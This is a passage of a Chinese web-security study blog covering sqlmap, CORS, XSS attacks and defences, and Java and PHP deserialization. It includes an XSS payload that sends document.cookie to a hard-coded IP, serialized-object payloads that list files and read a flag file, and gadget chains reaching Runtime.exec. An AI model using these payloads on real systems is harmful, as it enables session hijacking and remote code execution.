+<h4 id="Mysql-7-2中的改进"><a href="#Mysql-7-2中的改进" class="headerlink" title="Mysql 7.2中的改进"></a>Mysql 7.2中的改进</h4><p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190226215142.png" alt="img"></p>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>tamper 入口函数：</p>
+<ul>
+<li><p>常用tamper：</p>
+<ul>
+<li>base64encode.py</li>
+<li>Nonrecursivereplace.py 双写绕过</li>
+<li>randomcase.py</li>
+<li>Space2comment.py、Space2plus.py </li>
+<li>Randomcomments.py 用注释符分割sql关键字 </li>
+</ul>
+</li>
+<li><p>sqlmap5.7增加了处理json数据的函数，而这些函数也存在报错型注入，例如json_replace，就可以加入sqlmap，让sqlmap支持对json数据的注入 （需要sqlmap -r）</p>
+</li>
+<li><p>常用参数</p>
+<ul>
+<li>目标参数：-r、-u、-g </li>
+<li>request参数：<code>--cookie --user-agent --headers --proxy</code></li>
+<li>性能参数： —threads</li>
+<li>注入参数：<code>-p --dbms --os —tamper</code></li>
+<li>盲注参数：<code>--level --risk</code> —string 代码中有注释： level&gt;=3时，会测试user-agent,referer，level&gt;=5时，会测试HOST，level&gt;=2时，会测试cookie</li>
+<li>技术参数：<code>--technique</code> 6种：E报错、T时间盲注、B布尔盲注、（I）Inline内联查询、S可多语句查询（stacked）、union查询</li>
+<li>枚举参数：<code>-b --current-user --current-db --dbs --tables --columns  --dump</code>  </li>
+<li>操作系统参数：<code>--os-pwn --os-shell --os-cmd</code></li>
+<li>工作参数：<code>--flush-session</code></li>
+</ul>
+</li>
+<li><p>源码分析：</p>
+<ul>
+<li><p>框架分析</p>
+<ul>
+<li>核心模块：lib、extra、plugins</li>
+<li>xml：检测载荷</li>
+<li>txt：爆破字典</li>
+</ul>
+</li>
+<li><p>软件执行流程：</p>
+<ul>
+<li>设置：</li>
+</ul>
+</li>
+<li><p>检测过程：防火墙检测、（网络）稳定性检测、参数是否为动态参数检测、SQL注入检测</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><p>DOM、Cookie、XMLHttpRequest（Ajax异步网络加载的主要方法）受浏览器同源策略的限制，那很多业务需要跨域，如何通过javascript实现跨域呢？</p>
+<ul>
+<li><p>同域代理：Ajax向同域下的服务器发送请求，同时携带真实请求地址及参数<code>&#39;/proxy?url=http://www.sina.com.cn&#39;</code>，服务器接受请求后根据地址及参数转发请求，服务器可以直接模拟客户端发送请求，无需浏览器，也就没有同源策略的限制，</p>
+</li>
+<li><p>jsonp：利用<code>&lt;script&gt;</code>标签可以跨域加载资源，实际上就是直接通过script标签请求json数据，服务器返回一个回调函数渲染数据显示在html页面上。（所以jsonp的跨域数据交互也只能用做get请求）</p>
+</li>
+<li><p>postMessage：跨窗口传递消息</p>
+<p>otherWindow.postMessage(message, targetOrigin, [transfer]);</p>
+</li>
+<li><p>CORS：前两种解决方法其实并没有解决跨域问题，只是绕开同源策略而另辟蹊径实现的跨域数据交互，可以说是技术不成熟时的临时解决方案；随着html5的到来，出现了新的跨域策略，CORS跨域资源共享，主要通过一系列以Access-Control-Allow-Origin为主的HTTP头部完成，分为简单请求和非简单请求，感觉一般情况下还是简单请求，非简单请求涉及PUT、DELETE以及Content-type：application/json等，简单请求的流程：</p>
+<p>有一点需要强调：ajax在发出请求时，请求是能够正常发送的，服务器也会正常响应的，只是浏览器对于服务器响应的数据拒绝接收，应用CORS时，请求头部会添加Origin字段，服务器需要添加一个Access-Control-Allow-Origin响应头指明可以共享数据的域。复杂请求需要先发送OPTIONS预检请求，如果预检不通过，就不会发送正式请求</p>
+<p>exercise：<a href="https://github.com/FatDong1/cross-domain" target="_blank" rel="noopener">https://github.com/FatDong1/cross-domain</a></p>
+</li>
+</ul>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
+<li>本质：HTML注入（将数据解析为html代码或js代码执行）</li>
+<li>三种类型：<ol>
+<li>反射型：用户输入直接反射给浏览器（不存储到数据库）</li>
+<li>存储型：用户输入— 数据库— 浏览器渲染</li>
+<li>DOM型：通过js（如document.write、xxx.innerHTML等）添加DOM节点— 浏览器渲染</li>
+</ol>
+</li>
+</ul>
+<h4 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h4><ol>
+<li>Cookie劫持 — HttpOnly标识（禁止js读取cookie）— XST（利用TRACE调试：会将请求头作为Response Body返回）</li>
+<li>控制用户的浏览器：<ul>
+<li>GET请求：如插入一张图片，图片链接为删除某篇文章的url，攻击者只需要让博主执行这段js代码，就可以删除文章（类似于CSRF）</li>
+<li>POST请求：通过js模拟浏览器发送请求，发送请求的方式有两种：form和XMLHttpRequest<ul>
+<li>写html代码构造<strong>form表单</strong>，自动提交表单 — 防御： 验证码 </li>
+<li>通过<strong>XMLHttpRequest</strong> post方法</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>XSS钓鱼：修改密码 — 需要输入old password — 构造伪登录的页面</li>
+<li>识别用户的浏览器、识别用户安装的软件（挂马攻击）</li>
+<li>BeEF：可以将被害人的主机变成伪僵尸网络的一部分，窃取内存信息、把受害人重定向恶意链接、开启摄像头等多种类型的攻击</li>
+<li>终极利用方式：XSS Worm</li>
+</ol>
+<h4 id="XSS构造技巧"><a href="#XSS构造技巧" class="headerlink" title="XSS构造技巧"></a>XSS构造技巧</h4><p><a href="https://pentesterlab.com/exercises/xss_and_mysql_file/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/xss_and_mysql_file/course</a></p>
+<p>防御方式：并未过滤</p>
+<p>payload：<code>&lt;script&gt;document.write(&quot;&lt;img src=&#39;http://123.207.153.65:9999?cookie=&quot;+document.cookie+&quot; &#39;/&gt;&quot;);&lt;/script&gt;</code></p>
+<ol>
+<li>转义— GBK编码绕过，转义双引号时<code>%c1</code>组成一个新的Unicode字符</li>
+<li>长度限制— 利用事件缩短长度、利用location.hash（没有限制,但url有限制）、利用注释符通过注释中间html代码绕过长度限制</li>
+<li>base标签：攻击者通过base标签设置为自己的vps地址，就劫持了当前页面的相对路径，就可以在自己vps上伪造图片、链接或脚本</li>
+<li>利用window.name缩短长度如<code>window.name=&#39;document.cookie;alert(name);&#39;</code></li>
+<li>html5一些新标签的使用：<code>&lt;audio&gt; &lt;vedio&gt;</code> 等</li>
+</ol>
+<h4 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h4><p>分为输入端过滤和输出端过滤，分析产生在输出端，所以关键在输出端</p>
+<p>分析XSS的产生在输出端浏览器渲染（MVC中的View层），所以关键在于输出端的过滤。一般模版系统中都对输出变量使用escape处理，即默认html实体编码，</p>
+<ul>
+<li><p>输入检查：类型限制、格式检查、检查的逻辑需放在服务器端，一般过滤或编码<code>&lt; &gt; &#39; &quot;</code>; 匹配XSS的攻击特征，开源XSS Filter的实现（匹配是否有<code>&lt;script&gt;、javascript等</code>  ） 问题：</p>
+<ul>
+<li>无法判断用户数据的输出语境，会产生漏报，如恶意url地址</li>
+<li>可能会改变用户数据的语义</li>
+</ul>
+</li>
+<li><p>输出检查：根据变量输出的不同场景，选择合适的编码（道哥：在正确的地方做正确的编码），合适编码的选取关键要根据浏览器的解析顺序</p>
+<ul>
+<li>html代码：标签、属性 — htmlencode</li>
+<li>js代码：script标签、事件 — JavascriptEncode</li>
+<li>url地址：URLEncode，注意URL中的Protocal和Host部分不能编码，否则估计无法识别这是url地址从而调用url解码了— 如果用户能够控制URL，又不能全部进行编码，应该如果过滤呢？这种情况首先检查变量是否以http://开头（协议白名单），保证不会出现伪协议攻击，再对变量进行URLEncode</li>
+</ul>
+</li>
+<li><p>其他：</p>
+<ul>
+<li>HttpOnly的添加</li>
+<li>DOM型XSS的防御：由于使用js输出DOM节点，所以需要先做JavascriptEncode再根据DOM节点的场景进行合适的编码</li>
+</ul>
+</li>
+<li>浏览器端：CSP的设置</li>
+</ul>
+<h4 id="浏览器解码"><a href="#浏览器解码" class="headerlink" title="浏览器解码"></a>浏览器解码</h4><p>主要是HTML解析、JS解析、URL解析</p>
+<p>浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：<strong>HTML解析、JS解析和URL解析</strong>，每个解析器负责HTML文档中各自对应部分的解析工作。下面以一篇HTML文档解析来简单的讨论下解析器如何协同工作的。</p>
+<p>首先浏览器接收到一个HTML文档时，会触发<strong>HTML解析器</strong>对HTML文档进行<strong>词法解析</strong>，这一过程<strong>完成HTML解码并创建DOM树</strong>，接下来<strong>JavaScript解析器会介入对内联脚本进行解析</strong>，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。</p>
+<h4 id="富文本XSS防御"><a href="#富文本XSS防御" class="headerlink" title="富文本XSS防御"></a>富文本XSS防御</h4><p>思想：白名单</p>
+<ul>
+<li><p>标签和属性应该使用白名单</p>
+</li>
+<li><p>事件和一些危险的标签如<code>&lt;base&gt; &lt;iframe&gt; &lt;script&gt; &lt;form&gt;</code>等应该被禁止</p>
+</li>
+<li>开源的XSS Filter 如在PHP中，HTMLPutify</li>
+</ul>
+<ol>
+<li>模版引擎与XSS防御</li>
+<li>Markdown与XSS防御</li>
+</ol>
+<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>漏洞本质：不可信的输入和未检测反序列化对象安全性</p>
+<p>反序列化：将对象的状态信息转换为可以存储或传输的字节流形式的过程 </p>
+<p>反序列化应用场景：</p>
+<ul>
+<li>HTTP：多平台的通信、管理等</li>
+<li>RMI（Remote Method Invocation）：用于实现远程过程调用的api，基于反序列化，默认端口1099</li>
+<li>JMX（Java Management ）：Java平台上为 应用程序、设备、系统等植入管理功能的框架，JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。中间件软件 WebLogic 的管理页面就是基于 JMX 开发的，而 JBoss 则整个系统都基于 JMX 构架。</li>
+</ul>
+<p>漏洞成因：Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
+<h4 id="POP利用链"><a href="#POP利用链" class="headerlink" title="POP利用链"></a>POP利用链</h4><p>Java的反射机制：见Java速成</p>
+<p>POC构造：<a href="https://p0sec.net/index.php/archives/121/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/121/</a></p>
+<p>我的理解：Java反射调用Runtime.getRuntime.exec(command) — trasform函数自动执行 — LazyMap的get基础方法 — getValue — TiedMapEntry的toString — 需要寻找一个类重载readObject且调用toString — BadAttributeValueExpException — 然后传入的形参为私有变量(利用Java反射给私有变量赋值) — 利用ObjectOutputStream的writeObject构造POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">                AbstractInputCheckedMapDecorator$MapEntry.setValue()</span></span><br><span class="line"><span class="comment">                    TransformedMap.checkSetValue()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Class.getMethod()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                        InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            Method.invoke()</span></span><br><span class="line"><span class="comment">                                Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Requires:</span></span><br><span class="line"><span class="comment">        commons-collections &lt;= 3.2.1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget Chain</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">				TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">					LazyMap.getValue()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">							InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">								Method.invoke()</span></span><br><span class="line"><span class="comment">									Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            	Method.invoke()</span></span><br><span class="line"><span class="comment">                            		Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            	Method.invoke()</span></span><br><span class="line"><span class="comment">                            		Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>面向属性编程：从现有运行环境中寻找一系列的代码调用，然后根据需求构成一组连续的调用链，用以控制程序的执行流程。</p>
+<p>ROP：寻找当前系统环境或内存环境里已经存在的，具有固定地址且带有返回操作的指令集；用于内存溢出控制指令执行流程</p>
+<p>POP：寻找当前环境中已经定义或能动态加载的对象中的属性（函数方法），构成一个调用组合形成一个完整的、具有目的性的操作。用于反序列化过程中控制代码执行流程</p>
+<h4 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h4><ol>
+<li><p>黑盒流量分析：</p>
+<p>在Java反序列化传送的包中，一般有两种传送方式，在TCP报文中，一般二进制流方式传输，在HTTP报文中，则大多以base64传输。因而在流量中有一些特征：</p>
+<ul>
+<li>TCP：必有aced0005，这个16进制流基本上也意味者java反序列化的开始；</li>
+<li>HTTP：必有rO0AB，其实这就是aced0005的base64编码的结果；</li>
+</ul>
+<p>以上意味着存在Java反序列化，可尝试构造payload进行攻击。</p>
+<p>黑盒java的RMI：</p>
+<p>rmi是java的一种远程对象（类）调用的服务端，默认于1099端口，基予socket通信，该通信实现远程调用完全基于序列化以及反序列化。</p>
+</li>
+<li><p>白盒代码审计：</p>
+<ul>
+<li><p>观察实现了Serializable接口的类是否存在问题。</p>
+</li>
+<li><p>观察重写了readObject方法的函数逻辑是否存在问题。</p>
+</li>
+<li><p>定向功能分析：重点关注数据传输和存储的功能点：数据传输、网络通信、导入模板文件、DB数据库存储、日志格式化存储等业务场景</p>
+</li>
+<li><p>敏感函数回溯：搜索代码中反序列化函数的调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>观察反序列化时是否重写readObject方法，重写过程中是否有不合理之处，找到反序列化对象输入点后，再考察Class Path是否有包含Apache Common Collections &lt; 3.2.1等危险库</p>
+</li>
+</ol>
+<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>反序列化目的是对象的传递，所以如果写示例代码也就是定义一个类（类里可以有各种类型的属性私有、静态、共有等）[<em>这里有一个严重的错误！ps：对象不一定都是类，比如字符串也是对象，不知道php中算不算，但是在自己的理解中对象的概念不应该如此狭隘</em>]，然后生成实体对象，再经过serialize序列化，之后就是传输或存储了。</p>
+<p>比较重要的三个魔术方法：</p>
+<ul>
+<li>__sleep: 相当于序列化的预处理，如果存在此方法，serialize调用之前会先调用它，返回应该被序列化的属性（毕竟对象的所有状态不是应该都被序列化的 Java中这种会利用关键字transient）</li>
+<li>__wakeup：反序列化之前会被调用（对象还原前的初始化数据操作），用于准备反序列化的数据（相当于Java中的readObject方法）</li>
+<li>__toString：当对象被当作字符串打印时会返回的内容，由此方法定义</li>
+</ul>
+<ol>
+<li><h6 id="PHP反序列化对象注入"><a href="#PHP反序列化对象注入" class="headerlink" title="PHP反序列化对象注入"></a>PHP反序列化对象注入</h6><p>绕过<code>__wakeup</code>函数：CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
+<p>payload最好写代码自己生成，比如protected属性前面还会加上\00*\00，private前面还会加类名，自己写很容易出错</p>
+</li>
+<li><h6 id="Session反序列化对象"><a href="#Session反序列化对象" class="headerlink" title="Session反序列化对象"></a>Session反序列化对象</h6><p>漏洞原理：不同的引擎存储方式不同</p>
+<ul>
+<li>php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</li>
+<li>php 键名＋竖线＋经过serialize()函数反序列处理的值</li>
+<li>php_serialize serialize()函数反序列处理数组方式</li>
+</ul>
+<p>我们先测试一下php和php_serialize的区别，测试代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line"><span class="comment">//ini_set('session.serialize_handler','php');</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"test"</span>]=$_GET[<span class="string">"t"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出的结果 php_serialize为t:1:{s:4:”test”;s:4:”1111”;} php的结果为test|s:4:”1111”;<br>所以我们看到，如果我们的$_SESSION[‘ceshi’]=’’|O:8:”students”:0:{}’;’ 那么当我们用php_serialize存储时候，他会是a:1:{s:5:”测试”;s:20:”|O:8:”students”:0:{}”;} 然后当我们用php进行读取的时候，反序列化的结果会是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:5:"</span>ceshi<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(students)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/11234137-1cf2ea307bdeb74a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+</ol>
+<p>Php内部的session存储机制为php_serialize，会存储文件上传信息，也不管是啥吧，肯定包含文件名，可能内部存储的是这种格式<code>t:1:{s:4:&quot;filename&quot;;s:4:&quot;filename_value&quot;;}</code>；客户端可以通过POST <code>session.upload.progress.prefix</code> 读取session文件（读取过程中会反序列化），但本地反序列化设置为php，我们将</p>
+<p>filename=’|O:5:”OowoO”:1:{s:4:”mdzz”;s:36:”print_r(scandir(dirname(<strong>FILE</strong>)));”;}’，将会解析为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:8:"</span>filename<span class="string">";s:71:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(OowoO)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  	 $mdzz = 'print_r(scandir(dirname(__FILE__)));'</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>O:5:”OowoO”:1:{s:4:”mdzz”;s:88:”print_r(file_get_contents(“/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php”));”;}</p>
+<ol start="3">
+<li><h6 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h6></li>
+</ol>
+<ul>
+<li>反序列化的输入点用户可控</li>
+<li>反序列化类中存在魔术方法</li>
+<li>魔术方法中存在敏感操作</li>
+</ul>
+<ol start="4">
+<li>POP链（面向属性编程）</li>
+<li>扩充</li>
+</ol>
+<p>phpinfo中有两栏：</p>
+<ul>
+<li>master value：php.ini中的内容</li>
+<li>local value：当前目录的设置，可能由于服务器apache的配置（apache的配置会覆盖php.ini的配置）、.htaccess或者代码中ini_set有设置，相当于自定义，自定义的会覆盖默认值（php.ini）SSRF漏洞原理</li>
+</ul>
+<p>### </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="m3lon WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/16/Web安全面试准备二/" rel="next" title="Web安全面试准备二">
+                <i class="fa fa-chevron-left"></i> Web安全面试准备二
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzYxOC8xMDE3Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/UMR.png" alt="m3lon">
+            
+              <p class="site-author-name" itemprop="name">m3lon</p>
+              <p class="site-description motion-element" itemprop="description">萌新一枚</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/Web安全/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://lambdax.me/" title="Lambdax" target="_blank">Lambdax</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.51cto.com/skytina" title="skytina" target="_blank">skytina</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://idoge.cc/" title="Dik1s" target="_blank">Dik1s</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.cnblogs.com/iamstudy" title="l3m0n" target="_blank">l3m0n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://o0xmuhe.github.io/" title="0xmuhe" target="_blank">0xmuhe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://k1n9.me/" title="k1n9" target="_blank">k1n9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://stone.moe/" title="StoneMoe" target="_blank">StoneMoe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pi4net.com/" title="pi4net" target="_blank">pi4net</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#OWASP-TOP-10"><span class="nav-number">1.</span> <span class="nav-text">OWASP TOP 10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击技巧"><span class="nav-number">2.1.</span> <span class="nav-text">攻击技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL盲注"><span class="nav-number">2.2.</span> <span class="nav-text">SQL盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入"><span class="nav-number">2.3.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二次注入"><span class="nav-number">2.4.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方式"><span class="nav-number">2.5.</span> <span class="nav-text">绕过方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL提权"><span class="nav-number">2.6.</span> <span class="nav-text">SQL提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御方式"><span class="nav-number">2.7.</span> <span class="nav-text">防御方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql-7-2中的改进"><span class="nav-number">2.8.</span> <span class="nav-text">Mysql 7.2中的改进</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.9.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器安全"><span class="nav-number">3.</span> <span class="nav-text">浏览器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同源策略"><span class="nav-number">3.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#跨域"><span class="nav-number">3.2.</span> <span class="nav-text">跨域</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">4.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 